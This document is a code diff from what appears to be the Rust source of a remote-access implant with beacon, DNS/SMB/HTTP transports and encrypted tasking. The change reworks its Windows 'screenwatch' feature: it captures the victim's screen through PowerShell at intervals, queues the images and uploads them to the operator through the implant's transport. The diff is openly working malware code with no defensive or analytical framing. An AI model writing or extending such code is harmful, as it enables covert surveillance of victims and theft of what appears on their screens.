@@ -54,6 +54,8 @@ mod portfwd;
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::{Arc, Mutex, OnceLock};
 use std::collections::HashMap;
+#[cfg(target_os = "windows")]
+use std::collections::VecDeque;
 use std::process::Command;
 use base64::{engine::general_purpose::STANDARD, Engine as _};
 use crate::transport::{AgentTransport, TaskWire};
@@ -111,6 +113,8 @@ fn dyn_working_hours() -> std::sync::MutexGuard<'static, String> {
 static SCREENWATCH_STOP: AtomicBool = AtomicBool::new(false);
 #[cfg(target_os = "windows")]
 static SCREENWATCH_HANDLE: OnceLock<Mutex<Option<std::thread::JoinHandle<()>>>> = OnceLock::new();
+#[cfg(target_os = "windows")]
+static SCREENWATCH_UPLOADS: OnceLock<Mutex<VecDeque<Vec<u8>>>> = OnceLock::new();
 
 #[cfg(target_os = "windows")]
 fn screenwatch_handle() -> std::sync::MutexGuard<'static, Option<std::thread::JoinHandle<()>>> {
@@ -118,7 +122,29 @@ fn screenwatch_handle() -> std::sync::MutexGuard<'static, Option<std::thread::Jo
 }
 
 #[cfg(target_os = "windows")]
-fn spawn_screenwatch_thread(agent_id: String, aes_key: Vec<u8>, interval_sec: u64) {
+fn screenwatch_uploads() -> std::sync::MutexGuard<'static, VecDeque<Vec<u8>>> {
+    SCREENWATCH_UPLOADS.get_or_init(|| Mutex::new(VecDeque::new())).lock().unwrap()
+}
+
+/// Flush frames captured by the watcher through the active transport. The
+/// background thread cannot borrow AgentTransport safely, so the beacon thread
+/// owns the actual upload and does not silently force HTTP.
+#[cfg(target_os = "windows")]
+pub fn drain_screenwatch_uploads(t: &mut AgentTransport) {
+    loop {
+        let png = screenwatch_uploads().pop_front();
+        let Some(png) = png else { break; };
+        if config::TRANSPORT == "dns" || config::TRANSPORT == "smb" {
+            // These transports currently have no binary upload framing; do
+            // not turn every captured frame into a synthetic task-0 error.
+            continue;
+        }
+        t.upload_file(0, "screenwatch.png", &png);
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn spawn_screenwatch_thread(interval_sec: u64) {
     SCREENWATCH_STOP.store(false, Ordering::Relaxed);
     let handle = std::thread::spawn(move || {
         let sc_ps = concat!(
@@ -140,9 +166,11 @@ fn spawn_screenwatch_thread(agent_id: String, aes_key: Vec<u8>, interval_sec: u6
                 if o.status.success() {
                     let b64 = String::from_utf8_lossy(&o.stdout).trim().to_string();
                     if let Ok(png) = STANDARD.decode(&b64) {
-                        let enc = crate::crypto::seal(&aes_key, &png);
-                        let path = format!("/upload/{}/screenwatch.png", agent_id);
-                        crate::transport::http_do("POST", &path, &enc);
+                        let mut uploads = screenwatch_uploads();
+                        // Keep only the newest few frames if the transport is
+                        // unavailable, avoiding an unbounded memory queue.
+                        if uploads.len() >= 3 { uploads.pop_front(); }
+                        uploads.push_back(png);
                     }
                 }
             }
@@ -1849,9 +1877,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             } else {
                 task.args.trim().parse::<u64>().unwrap_or(5)
             };
-            let agent_id = t.agent_id.clone();
-            let aes_key  = t.aes_key.clone();
-            spawn_screenwatch_thread(agent_id, aes_key, interval);
+            spawn_screenwatch_thread(interval);
             t.send_result(task.id, "[+] screenwatch started", "");
         }
         #[cfg(target_os = "windows")]
